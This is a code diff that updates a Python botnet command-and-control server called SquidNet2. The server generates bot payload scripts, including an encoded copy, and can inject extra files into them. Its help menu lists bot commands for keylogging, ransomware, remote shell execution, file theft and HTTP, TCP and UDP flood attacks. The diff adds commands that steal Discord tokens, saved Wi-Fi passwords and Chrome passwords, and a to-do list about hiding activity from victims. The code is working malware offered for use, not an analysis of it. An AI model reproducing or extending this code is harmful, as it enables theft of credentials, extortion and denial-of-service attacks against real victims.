@@ -1,15 +1,36 @@
-import socket, threading, hashlib, os, datetime, time, sqlite3, shutil, urllib.request, json, sys
-
-class BotNet:
-    """Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
+#!/usr/local/bin/python3
+import socket, threading, hashlib, os, time, sqlite3, shutil, urllib.request, json, sys, base64
+from optparse import OptionParser
+from datetime import datetime
+class SquidNet:
+    """
+    # SquidNet2 - The sequel to SquidNet that nobody asked for, but everyone needed. 
+    
+    Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
     There are many functions inside of the class, where they have many different uses. They vary in usefullness
     and effectiveness, nonetheless they all contribute to the overall functioning of the server. It uses a lot
     of logic and similar code from DatCord, which was a server that truly displayed my advancements in network
     programming, where it also is an improvement from the previous SquidNet. SquidNet2 does not have as many bugs,
-    and also not as many useless functions. This script remains unfinished(I worked on it a lot on an airplane DX), 
-    so there could be many problems that could possibly occur."""
-    def logo(self):
-        """Logo of the script, nothing too special here."""
+    and also not as many useless functions.
+    
+    # To Do List
+    - Add a function that allows the possession of all the bot's keyboards.
+        - Mess with them a little bit >:)
+    - ✓ Make things look a more pleasing to the eye.
+    - ✓ Add some more developer notes for extra guidance for curious people looking at the source code.
+        - Educate some people :)
+    - ✓ Upgrade hashing algorithm(sha256 is too easy to crack)
+        - SquidNet2 is less hackable and more secure.
+    - Add Packet Encryption?
+    - More customizability
+    - ✓ Make things a little hidden for victims
+    - ✓ Utilize properties"""
+    @property
+    def logo(self=None):
+        """
+        # SquidNet2's Logo
+        
+        Logo of the script, nothing too special here."""
         logo = """
                                   /\\
                                  //\\\\
@@ -34,12 +55,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________           _____      .________
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  __/  |  |     |   ____/
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ /   |  |_    |____  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   /    ^   /    /       \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/\____   | /\ /______  /
-        \/    |__|             \/ || ||  \/     \/             \/           |__| \/        \/ 
+  _________            .__    .||_||_||__          __  ________         .________   _______   
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _|   ____/   \   _  \  
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ /____  \    /  /_\  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   //       \   \  \_/   \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_//______  / /\ \_____  /
+        \/    |__|             \/ || ||  \/     \/             \/             \/  \/       \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -52,11 +73,14 @@ class BotNet:
                              ____-\/-____
                                  -__-
                                 /    \\
-Advanced Botnet By DrSquid
+[+] Botnet By DrSquid
 [+] Github: https://github.com/DrSquidX"""
         return logo
-    def __init__(self, ip, port, version, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True):
-        """Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
+    def __init__(self, ip, port, version="5.0", external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True, injectfile=None):
+        """
+        # __init__() -> The initiation of the SquidNet
+
+        Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
         as it has the definitions of all of the important variables needed for functionality, and also for specification 
         of different things. Many things are defined here, such as the socket that will be used to handle all of the connections, 
         as well as all of the smaller, yet very important variables that would hinder the performace and functionality of 
@@ -82,14 +106,21 @@ Advanced Botnet By DrSquid
         self.keylogging = False
         self.botinfofile = "botinfo.txt"
         self.timetoautoban = 0
-        botinfo = open(self.botinfofile,"w").close()
+        self.injectfile = injectfile
+        self._inject = ""
+        working_inject = False
+        if self.injectfile is not None:
+            self._inject = open(self.injectfile,"r").read()
+            working_inject = True
+        if self.botinfofile not in os.listdir():
+            botinfo = open(self.botinfofile,"w").close()
         self.max_connpersec = 20
         self.connpersec = 0
         self.conncount = 0
         self.timer = 1
         self.conf_dbfile()
         file = open(self.logfile, "w").close()
-        self.log(self.logo())
+        self.log(self.logo)
         self.version = version
         if self.external_ip is None:
             self.external_ip = self.ip
@@ -99,15 +130,20 @@ Advanced Botnet By DrSquid
             self.quot = ""
         else:
             self.quot = "'''"
-        self.payload = self.gen_payload()
+        self._payload = self.payload
         self.payloadfile = open("SquidBot.py","w")
-        self.payloadfile.write(self.payload)
+        self.payloadfile.write(self._payload[1])
         self.payloadfile.close()
+        self.encoded_payload = open("SquidBot_b64.py","w")
+        self.encoded_payload.write(self._payload[0])
+        self.encoded_payload.close()
         if self.ftp_dir not in os.listdir():
             os.mkdir(self.ftp_dir)
-        self.log(f"""[({datetime.datetime.today()})][(INFO)]: Server Started on {self.ip}:{self.port}
-[({datetime.datetime.today()})][(INFO)]: Bots/Admins will connect to: {self.external_ip}:{self.external_port}
-[({datetime.datetime.today()})][(INFO)]: Payload Bot Script Generated in {os.path.join(os.getcwd(), "SquidBot.py")}""")
+        self.log(f"""[({datetime.today()})][(INFO)]: Server Started on {self.ip}:{self.port}
+[({datetime.today()})][(INFO)]: Bots/Admins will connect to: {self.external_ip}:{self.external_port}
+[({datetime.today()})][(INFO)]: Payload Bot Script Generated in '{os.path.join(os.getcwd(), self.payloadfile.name)}'
+[({datetime.today()})][(INFO)]: Encoded Payload Bot Script Generated in '{os.path.join(os.getcwd(), self.encoded_payload.name)}'(do not use this with py2exe, use the normal payload)"""
++(f"\n[({datetime.today()})][(INFO)]: File '{self.injectfile}' has been inserted into the payloads" if working_inject else "")+"""""")
         self.botnum = 1
         self.connlist = []
         self.botinfo = []
@@ -116,55 +152,41 @@ Advanced Botnet By DrSquid
         self.focus_conn = None
         self.focus_botname = ""
         self.admin_username = admin_user
-        self.admin_password = hashlib.sha256(admin_pass.encode()).hexdigest()
+        self.admin_password = self.Squidhash(admin_pass)
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         shutil.copyfile(os.path.join(os.getcwd(),self.payloadfile.name), os.path.join(os.getcwd(),self.ftp_dir,self.payloadfile.name))
-        self.log(f"[({datetime.datetime.today()})][(SERVER)]: Payload file has been transferred to the FTP directory(for extraction of Admin).")
-    def exec_sql_cmd(self, file, cmd):
-        """Optimization code made for executing commands on db files. The reason it was made was for optimization
-        purposes. This excerpt of code would be pretty much all over the place in this script if it weren't a
-        function, and it would make the script look less elegant and clean with all of the repitition."""
-        output = ""
-        try:
-            db = sqlite3.connect(file)
-            cursor = db.cursor()
-            cursor.execute(cmd)
-            output = cursor.fetchall()
-            db.commit()
-            cursor.close()
-            db.close()
-        except Exception as e:
-            self.log(f"[({datetime.datetime.today()})][(RESETSQL)]: Error with SQL Database file '{self.sqlfilename}': {e}, reconfiguring as a precaution.")
-            self.conf_dbfile()
-        return output
-    def conf_dbfile(self):
-        """This function helps configure the database file that contains the IP whitelists and banlists.
-        As you can see, there is the previous function that was used to optimize the code. What the function
-        truly does, is create the Database file if it doesn't already exist, and create the tables containing
-        the IP banlist and whitelist if they do not exist."""
-        try:
-            file = open(self.sqlfilename,"rb")
-        except:
-            file = open(self.sqlfilename,"wb")
-        file.close()
-        self.exec_sql_cmd(self.sqlfilename, "create table if not exists ipbanlist(ip)")
-        self.exec_sql_cmd(self.sqlfilename, "create table if not exists ipallowlist(ip)")
-    def return_iplist(self, list_type):
-        """This gets a list of the IPs, although you need to specify whether it is from the IP Whitelist
-        or the Banlist."""
-        banned_ips = self.exec_sql_cmd(self.sqlfilename, f"select ip from ip{list_type}list")
-        new_ip_list = []
-        for i in banned_ips:
-            new_ip_list.append(i[0])
-        return new_ip_list
-    def add_ip(self, ip, list_type):
-        """This adds an IP to the specified list type(either Whitelist or Banlist)"""
-        self.exec_sql_cmd(self.sqlfilename, f"insert into ip{list_type}list values('{ip}')")
-    def remove_ip(self, ip, list_type):
-        """This removes an IP to the specified list type(either Whitelist or Banlist)"""
-        self.exec_sql_cmd(self.sqlfilename, f"delete from ip{list_type}list where ip = '{ip}'")
+        self.log(f"[({datetime.today()})][(SERVER)]: Payload file has been transferred to the FTP directory(for extraction of Admin).")
+        self.ipsqlfile = "iplists.db"
+        self.ipsqlfile = os.path.join(os.getcwd(),self.ipsqlfile)
+        self.max_connpersec = 5
+        self.timer = 0
+        self.connpersec = 0
+        self.conncount = 0
+        self.waiting_ban = False
+        self.time_to_auto_ban = 2
+        self.banning = False
+        self.conf_db()
+        self.WebInterface = self.Webserver()
+        weblistening = threading.Thread(target=self.Weblisten)
+        weblistening.start()
+    @property
+    def botname_list(self):
+        botnames = [i[0] for i in self.botinfo]
+        return botnames
+    @property
+    def banlist(self):
+        """Gets all of the IP addresses in the IP banlist."""
+        return self.get_list("ban")
+    @property
+    def whitelist(self):
+        """Gets all of the IP addresses in the IP whitelist."""
+        return self.get_list("white")
+    @property
     def help_msg(self):
-        """The help message sent to the admins if they request it. It contains all of the information about
+        """
+        # Standard Help Message for admins
+
+        The help message sent to the admins if they request it. It contains all of the information about
         the commands, and also the commands themselves. The arguements are provided, so that the user can
         get a sense of how to actually use the commands effectively."""
         return """\n[(SERVER)]: Info about each command:
@@ -172,7 +194,7 @@ Advanced Botnet By DrSquid
 [+] !whitelistip <ip>                        - Adds an IP to the whitelist, allowing them to connect to the server during a DDoS Attack.
 [+] !unwhitelistip <ip>                      - Removes an IP from the whitelist.
 [+] !banip <ip>                              - Bans an IP from the server, therefore having them kicked every time they try to connect to the server.
-[+] !unbanip <ip>                            - Removes an IP from the server.
+[+] !unbanip <ip>                            - Unbans an IP from the server.
 [+] !focusconn <botname>                     - Only be able to send or see messages from a single bot.
 [+] !stopfocus                               - Stops focus mode.
 [+] !getipwhitelist                          - Obtains the list of the IP Addresses in the Whitelist.
@@ -181,6 +203,7 @@ Advanced Botnet By DrSquid
 [+] !help                                    - Displays this message.
 [+] !startftp                                - Start file transfer protocol between the admin and the server(to get any transferred Bot Files).
 [+] !togglelisten                            - Toggles the setting for the server to listen for connections or not.
+[+] !exit                                    - Leave the SquidNet cleanly.
 [+] Bot Commands:                
 [+] !filedownload <file>                     - Download a file on a single bot computer(requires focus mode).
 [+] !download <file> <link>                  - Make the bot download a file from the internet.
@@ -193,6 +216,7 @@ Advanced Botnet By DrSquid
 [+] !open <filename>                         - Open a file inside of the bots working directory.
 [+] !viewfilecontent <file>                  - View the contents of a file in the bots directory.
 [+] !writefile <filename>                    - Open and write inside of a file inside of the bots.
+[+] !renamefile <filename> <newname>         - Renames a file on the bot computer.
 [+] !sqlconnect <sqlfile>                    - Connect to a Sqlite3 Compatable Database file in the bots.
 [+] !changedir <dir>                         - Changes the bots working directory to the one specified(use '%user%' as the user for multiple bots).
 [+] !stopsql                                 - Disconnect from the connected Database file.
@@ -202,14 +226,21 @@ Advanced Botnet By DrSquid
 [+] !stopkeylog                              - Stops the keylogging.
 [+] !listdir                                 - List all of the items in the bots working directory.
 [+] !ransomware                              - Activates the ransomware program inside of the bots.
+[+] !getdiscordtoken                         - Gets the users Discord token if it exists.
+[+] !getwifipass                             - Gets the users saved wifi passwords(windows only).
+[+] !getpasswords                            - Takes the passwords from the 'User Data' chrome file(windows only).
 [+] DDoS Attack Commands:
 [+] !httpflood <website> <delay>             - Make the bots conduct an HTTP Flood Attack on the specified Website.
 [+] !tcpflood <ip> <port> <delay> <pkt_size> - Make the bots concuct a TCP Flood Attack on the specified IP and Port.
 [+] !udpflood <ip> <port> <delay> <pkt_size> - Make the bots concuct a UDP Flood Attack on the specified IP and Port.
 [+] !stopatk                                 - Stops the current DDoS Attack that is happening(only one can happen at a time).
 [+] Note: Any other instructions will be run as shell commands on the remote computers."""
-    def file_tranfer_help_msg(self):
-        """If the user decides to go onto FTP mode, they will be able to extract files that were extracted
+    @property
+    def file_transfer_help_msg(self):
+        """
+        # FTP help message for admins
+
+        If the user decides to go onto FTP mode, they will be able to extract files that were extracted
         from the server via the connected bots. This is the help message sent to the user, if they request help.
         Like the previous help message, it has all the commands and the information and parameters about them,
         for the user to use these commands effectively."""
@@ -231,11 +262,182 @@ Advanced Botnet By DrSquid
             self.server.bind((self.ip, self.port))
             working = True
         except Exception as e:
-            self.log(f"[({datetime.datetime.today()})][(ERROR)]: There was an error with binding the server: {e}. Try to change some of the variables in the Config files if needed.")
+            self.log(f"[({datetime.today()})][(ERROR)]: There was an error with binding the server: {e}. Check if your configuration was correct.")
         if working:
             self.listener = threading.Thread(target=self.listen).start()
+    def conf_db(self):
+        """Configures the IP Database so that it could store IP Addresses on an SQLite3 database."""
+        try:
+            file = open(self.ipsqlfile, "rb")
+        except:
+            file = open(self.ipsqlfile,"wb")
+        file.close()
+        self.exec_sql_cmd(self.ipsqlfile, "create table if not exists ipbanlist(ipaddr)")
+        self.exec_sql_cmd(self.ipsqlfile, "create table if not exists ipwhitelist(ipaddr)")
+    def add_to_ls(self, ltype, ip):
+        """Adds a specified IP address from the specified list type(specified in arguements)."""
+        self.exec_sql_cmd(self.ipsqlfile, f"insert into ip{ltype}list values('{ip}')")
+    def rem_fr_ls(self, ltype, ip):
+        """Removes a specified IP address from the specified list type(specified in arguements)."""
+        self.exec_sql_cmd(self.ipsqlfile, f"delete from ip{ltype}list where ipaddr = '{ip}'")
+    def get_list(self, ltype):
+        """Gets a list of IP Addresses through the specified type(specified in the `ltype` argument.)"""
+        ls = self.exec_sql_cmd(self.ipsqlfile, f"select ipaddr from ip{ltype}list")
+        return [i[0] for i in ls]
+    def add_to_whitelist(self, ip):
+        """Adds an IP Address to the IP whitelist."""
+        self.add_to_ls("white",ip)
+    def add_to_banlist(self, ip):
+        """Adds an IP Address to the IP banlist."""
+        self.add_to_ls("ban",ip)
+    def rem_fr_whitelist(self, ip):
+        """Removes an IP Address from the IP whitelist."""
+        self.rem_fr_ls("white",ip)
+    def rem_fr_banlist(self, ip):
+        """Removes an IP Address from the IP banlist."""
+        self.rem_fr_ls("ban",ip)
+    def reset_timer(self):
+        """Resets the `self.conncount` and `self.timer` variable, so that division between 
+        the amount of connections stays within 'connections per 30 seconds' and thus making 
+        the `self.connpersec` variable calculation accurate."""
+        while True:
+            time.sleep(30)
+            self.timer = 1
+            self.conncount = 0
+    def add_to_timer(self):
+        """Adds 1 to the `self.timer` variable every second; so it is basically just a timer."""
+        while True:
+            time.sleep(1)
+            self.timer += 1
+    def autobantimer(self, autobantime):
+        """If the `self.banning` variable is `False` and the maximum connections per second(referenced
+        in the `self.mac_connpersec` variable) is exceeded, there is a timer of `autobantime`(arguement)
+        which waits for the specified amount of seconds. If the connections per second is still above
+        the configured maximum, then the automatic IP Banning system will take place."""
+        time.sleep(autobantime)
+        if self.connpersec >= self.max_connpersec:
+            self.log("[(ANTI_DOS)] Banning all non-whitelisted IPs.")
+            self.banning = True
+    def listen(self):
+        """
+        # The New and Improved Listening Function
+        
+        Improved listening function for the server(Added v4.7). It has more adjustments and is also more optimised. 
+        It uses the Anti-DoS System that is used for other scripts that I am developing.
+        
+        # Overall Description(Taken from original `self.listen()` function)
+
+        A very important function for the server. It listens to all of the connections, if it is able to, as 
+        the `self.listening` variable can be toggled on and off, making the server unable to listen for connections. 
+        It also has some of the Anti-DDoS code, where it also closes any connections inside of the banlist, and 
+        allows connections in the whitelist into the server without any interruption."""
+        self.log(f'[({datetime.today()})][(LISTEN)]: Server is listening.....')
+        self.resetter = threading.Thread(target=self.reset_timer).start()
+        self.adder = threading.Thread(target=self.add_to_timer).start()
+        self.listening = True
+        while True:
+            try:
+                if self.listening:
+                    kicked = False
+                    self.server.listen()
+                    conn, ip = self.server.accept()
+                    if self.listening:
+                        if ip[0] in self.banlist:
+                            kicked = True
+                            conn.close()
+                        else:
+                            self.conncount += 1
+                            if self.connpersec > self.max_connpersec:
+                                self.connpersec = self.max_connpersec + 5
+                            if not self.banning:
+                                if self.connpersec > self.max_connpersec and not self.waiting_ban:
+                                    self.log(f"[({datetime.today()})][(DDOS_WARN)]: Possible DDoS Attack! Starting Autoban timer.")
+                                    self.waiting_ban = True
+                                    try_autoban = threading.Thread(target=self.autobantimer, args=(self.time_to_auto_ban,))
+                                    try_autoban.start()
+                            else:
+                                if ip[0] not in self.whitelist:
+                                    kicked = True
+                                    if ip[0] not in self.banlist:
+                                        self.log(f"[({datetime.today()})][(BAN)]: Banning {ip[0]} from the server, as they connected during the DDoS Attack.")
+                                        self.add_to_banlist(ip[0])
+                            if not kicked:
+                                conn.send(f"SquidNet Server v{self.version}".encode())
+                                handler = threading.Thread(target=self.handle, args=(conn, ip))
+                                handler.start()
+                            else:
+                                conn.close()
+                            self.connpersec = self.conncount / self.timer
+                    else:
+                        conn.close()
+            except Exception as e:
+                if "division by zero" not in str(e):
+                    self.log(f"[(ERROR)]: {e}")
+    def exec_sql_cmd(self, file, cmd):
+        """Optimization code made for executing commands on db files. The reason it was made was for optimization
+        purposes. This excerpt of code would be pretty much all over the place in this script if it weren't a
+        function, and it would make the script look less elegant and clean with all of the repitition."""
+        output = ""
+        try:
+            db = sqlite3.connect(file)
+            cursor = db.cursor()
+            cursor.execute(cmd)
+            output = cursor.fetchall()
+            db.commit()
+            cursor.close()
+            db.close()
+        except Exception as e:
+            self.log(f"[({datetime.today()})][(RESETSQL)]: Error with SQL Database file '{self.sqlfilename}': {e}, reconfiguring as a precaution.")
+            self.conf_dbfile()
+        return output
+    def conf_dbfile(self):
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+        
+        This function helps configure the database file that contains the IP whitelists and banlists.
+        As you can see, there is the previous function that was used to optimize the code. What the function
+        truly does, is create the Database file if it doesn't already exist, and create the tables containing
+        the IP banlist and whitelist if they do not exist."""
+        try:
+            file = open(self.sqlfilename,"rb")
+        except:
+            file = open(self.sqlfilename,"wb")
+        file.close()
+        self.exec_sql_cmd(self.sqlfilename, "create table if not exists ipbanlist(ip)")
+        self.exec_sql_cmd(self.sqlfilename, "create table if not exists ipallowlist(ip)")
+    def return_iplist(self, list_type):
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+        
+        This gets a list of the IPs, although you need to specify whether it is from the IP Whitelist
+        or the Banlist."""
+        banned_ips = self.exec_sql_cmd(self.sqlfilename, f"select ip from ip{list_type}list")
+        new_ip_list = []
+        for i in banned_ips:
+            new_ip_list.append(i[0])
+        return new_ip_list
+    def add_ip(self, ip, list_type):
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+        
+        This adds an IP to the specified list type(either Whitelist or Banlist)"""
+        self.exec_sql_cmd(self.sqlfilename, f"insert into ip{list_type}list values('{ip}')")
+    def remove_ip(self, ip, list_type):
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+        
+        This removes an IP to the specified list type(either Whitelist or Banlist)"""
+        self.exec_sql_cmd(self.sqlfilename, f"delete from ip{list_type}list where ip = '{ip}'")
     def conn_persec_timer(self):
-        """Function used for the not-so-perfect Anti-DDoS System. It measure the connections  per second, and 
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+        
+        Function used for the not-so-perfect Anti-DDoS System. It measure the connections  per second, and 
         decides whether to take action against them(by that I mean banning them)."""
         while True:
             time.sleep(1)
@@ -245,11 +447,11 @@ Advanced Botnet By DrSquid
             if self.max_connpersec <= self.connpersec:
                 self.timetoautoban += 1
                 if not self.auto_ban and self.timetoautoban >= 2:
-                    self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
+                    self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
                     self.auto_ban = True
             else:
                 if self.auto_ban:
-                    self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
+                    self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
                     self.auto_ban = False
                 self.timetoautoban = 0
             if self.timer >= 60:
@@ -261,26 +463,35 @@ Advanced Botnet By DrSquid
             except:
                 pass
     def config_conn_vars(self):
-        """Optimization code made for less repitition."""
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+
+        Optimization code made for less repitition."""
         self.connpersec = self.conncount / self.timer
         if self.connpersec >= self.max_connpersec:
             self.connpersec = self.max_connpersec + 5
         self.conncount += 1
         if self.max_connpersec <= self.connpersec:
             if not self.auto_ban and self.timetoautoban >= 2:
-                self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
+                self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
                 self.auto_ban = True
         else:
             if self.auto_ban:
-                self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
+                self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
                 self.auto_ban = False
             self.timetoautoban = 0
-    def listen(self):
-        """A very important function for the server. It listens to all of the connections, if it is able to, as 
+    def _listen(self):
+        """
+        # Warning! 
+        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
+        
+        A very important function for the server. It listens to all of the connections, if it is able to, as 
         the 'self.listening' variable can be toggled on and off, making the server unable to listen for connections. 
         It also has some of the Anti-DDoS code, where it also closes any connections inside of the banlist, and 
         allows connections in the whitelist into the server without any interruption."""
-        self.log(f'[({datetime.datetime.today()})][(LISTEN)]: Server is listening.....')
+        self.log(f'[({datetime.today()})][(DEPRECATION_WARNING)]: You are using an outdated function in the SquidNet! You should use "self.listen()" instead of "self._listen()".')
+        self.log(f'[({datetime.today()})][(LISTEN)]: Server is listening.....')
         self.listening = True
         connpersectimer = threading.Thread(target=self.conn_persec_timer)
         connpersectimer.start()
@@ -301,7 +512,7 @@ Advanced Botnet By DrSquid
                                 if ip[0] in self.return_iplist("allow"):
                                     self.config_conn_vars()
                                 else:
-                                    self.log(f"[({datetime.datetime.today()})][(BANNING_IP)]: {ip[0]} attempted to join the server during the DDoS Attack, banning as a precaution.")
+                                    self.log(f"[({datetime.today()})][(BANNING_IP)]: {ip[0]} attempted to join the server during the DDoS Attack, banning as a precaution.")
                                     self.add_ip(ip[0],"ban")
                                     conn.close()
                                     kicked = True
@@ -314,12 +525,7 @@ Advanced Botnet By DrSquid
                     else:
                         conn.close()
                 except Exception as e:
-                    self.log(f"[({datetime.datetime.today()})][(ERROR)]: There was an error with listening for connections: {e}")
-    def obtain_botname_list(self):
-        botnames = []
-        for i in self.botinfo:
-            botnames.append(i[0])
-        return botnames
+                    self.log(f"[({datetime.today()})][(ERROR)]: There was an error with listening for connections: {e}")
     def parse_info_msg(self, infomsg, conn, srcport):
         """There is a message sent by every client to the server, which would contain information about them.
         This include their hostname, IP Address, User, and Operating System. This is mainly for the bots,
@@ -362,7 +568,10 @@ Advanced Botnet By DrSquid
             filename += f" {i}"
         return filename.strip()
     def log(self, logitem, display=True):
-        """Important function, needed for logging. This is so that the Server Owner can see what happened in the 
+        """
+        # Logging
+
+        Important function, needed for logging. This is so that the Server Owner can see what happened in the 
         server, in case of a crash or bug that needed to be fixed. This helps, as all of the output in the server 
         is the same as the output in the log file. The server owner would be able to see any bugs or issues, or 
         easily anything that happened in the server at all. However, the log file is wiped everytime the server
@@ -375,15 +584,18 @@ Advanced Botnet By DrSquid
             content = file.read()
             file.close()
         except Exception as e:
-            print(f"[({datetime.datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution.")
-            content = f"""{self.logo()}\n[({datetime.datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution."""
+            print(f"[({datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution.")
+            content = f"""{self.logo}\n[({datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution."""
         file = open(self.logfile,"w")
         file.write(content+"\n"+logitem)
         file.close()
     def send_to_other(self, sender, reciever, msg, recieverconn, send_raw=False):
-        """Code for optimizing sending and logging at the same time. It logs the message that is being sent, and 
+        """
+        # Optimised direct message sending
+
+        Code for optimizing sending and logging at the same time. It logs the message that is being sent, and 
         it also sends the message to the connection that the sender its trying to send to."""
-        item = f"[({datetime.datetime.today()})][({sender})--->({reciever})]: {msg}"
+        item = f"[({datetime.today()})][({sender})--->({reciever})]: {msg}"
         self.log(item)
         if not send_raw:
             recieverconn.send(f"\n[({sender})]: {msg}".encode())
@@ -416,8 +628,29 @@ Advanced Botnet By DrSquid
         if transferred:
             time.sleep(1)
             self.send_to_other("SERVER",self.admin_username,"File Transfer completed.", conn)
+    def Squidhash(self,hash):
+        """
+        # The SquidHash Algorithm
+
+        An incredibly low quality hashing algorithm that might not even be considered hashing. It essentially does a larget mix
+        of hashing and encoding, and creates a long gibberish packet that can be interpreted by the server to help with 
+        authentication. It exists because sha256 is too easy to replicate for offline brute-forcing, and therefore Squidhash is
+        a more secure option, as it is less easy to replicate it unless people get access to the algorithm itself.
+        """
+        more_secure_str = [x for x in list(hashlib.sha512(base64.b64encode(base64.a85encode("".join([hashlib.sha512(x.encode()).hexdigest() for x in "".join([hashlib.sha512(x.encode()).hexdigest() for x in hash])]).encode()))).hexdigest())[30:90]]
+        more_secure_str.reverse()
+        more_secure_str = [x for x in more_secure_str][20:70]
+        more_secure_str.reverse()
+        more_secure_str = "".join([x for x in more_secure_str[11:20]])+"".join([x for x in more_secure_str[1:10]])+"".join([x for x in more_secure_str[21:30]])
+        more_secure_str = list(base64.a85encode(base64.b64encode(base64.b32encode(base64.b16encode(base64.b85encode(more_secure_str.encode()))))).decode())
+        more_secure_str.reverse()
+        more_secure_str = base64.a85encode("".join([x for x in list(base64.a85encode(base64.b64encode(base64.b85encode(base64.a85encode(base64.a85encode(base64.a85encode(base64.b32encode(base64.a85encode(base64.b64encode(base64.b16encode(base64.a85encode(base64.b16encode("".join([x for x in more_secure_str[30:120]]).encode()))))))))).hex().encode()))).hex())[2500:5000]]).encode())
+        return more_secure_str.decode()
     def handle(self, conn, ip):
-        """Very important function, needed for handling the connections of the clients. The way a bot is recognized 
+        """
+        # Client Handling
+
+        Very important function, needed for handling the connections of the clients. The way a bot is recognized 
         is quite simple really. There are many variables that help with the process. The handler first uses the information 
         packet(the one with all of the client information), to see if the bot is a bot or a fake bot. If the information 
         packet is invalid(if it does not start with '!botreg'), the connection will be simply closed. If the packet is 
@@ -430,13 +663,23 @@ Advanced Botnet By DrSquid
         prevent any breaches. The password provided would be hashed into sha256, to see if it matches with the hashed 
         password that the server has. It these all match, access is granted to the admin, where they can now do whatever 
         they want with the bots, whether good or bad. There are many things to do with the assortment of commands that
-        are provided."""
+        are provided.
+        
+        If you want to use the original functions for the IP Database(they will be deprecated in future versions):
+        * `self.add_to_banlist(ip)` -> `self.add_ip(ip, "ban")`
+        * `self.add_to_whitelist(ip)` -> `self.add_ip(ip,"allow")`
+        * `self.rem_fr_banlist(ip)` -> `self.remove_ip(ip, "ban")`
+        * `self.rem_fr_whitelist(ip)` -> `self.remove_ip(ip,"allow")`
+        * `self.whitelist` -> `self.return_iplist("allow")`
+        * `self.banlist` -> `self.return_iplist("ban")`
+        """
         bot = False
         name = ip
         admin = False
         registered = False
         filesize = 0
         bytesrecv = 0
+        failed_auth = 0
         while True:
             try:
                 display_single_msg = True
@@ -462,7 +705,7 @@ Advanced Botnet By DrSquid
                                 break
                             registered = True
                             original_name = name
-                            self.log(f"[({datetime.datetime.today()})][(BOTJOIN)]: Bot {name} has joined the botnet.")
+                            self.log(f"[({datetime.today()})][(BOTJOIN)]: Bot {name} has joined the botnet.")
                             try:
                                 self.adminconn.send(f"\n[(SERVER)]: Bot {name} has joined the botnet.".encode())
                             except:
@@ -475,8 +718,8 @@ Advanced Botnet By DrSquid
                                     try:
                                         username = msg.split()[1]
                                         password = msg.split()[2]
-                                        if username == self.admin_username and hashlib.sha256(password.encode()).hexdigest() == self.admin_password:
-                                            self.log(f"[({datetime.datetime.today()})][(INFO)]: A new admin session has been created.")
+                                        if username == self.admin_username and self.Squidhash(password) == self.admin_password:
+                                            self.log(f"[({datetime.today()})][(INFO)]: A new admin session has been created.")
                                             name = self.admin_username
                                             admin = True
                                             self.adminconn = conn
@@ -489,19 +732,26 @@ Advanced Botnet By DrSquid
                                                     break
                                         else:
                                             self.send_to_other("SERVER",name,"Authentication Failed.", conn)
+                                            failed_auth += 1
+                                            if failed_auth >= 3:
+                                                self.log(f"[({datetime.today()})][(AUTH_KICK)]: Kicked Bot '{name}' due to 3 failed authentication attempts!")
+                                                conn.close()
                                     except:
                                         pass
                                 else:
                                     self.send_to_other("SERVER",name,"There is already an active owner session. Please wait until they log off.", conn)
                             elif msg.startswith("!key") and self.keylogging:
-                                keystroke = msg.split()[1]
-                                keyfile = open(name+".txt","r")
-                                content = keyfile.read()
-                                keyfile.close()
-                                newkeyfile = open(name+".txt","w")
-                                newkeyfile.write(content)
-                                newkeyfile.write(f"\n[+] {keystroke}")
-                                newkeyfile.close()
+                                try:
+                                    keystroke = msg.split()[1]
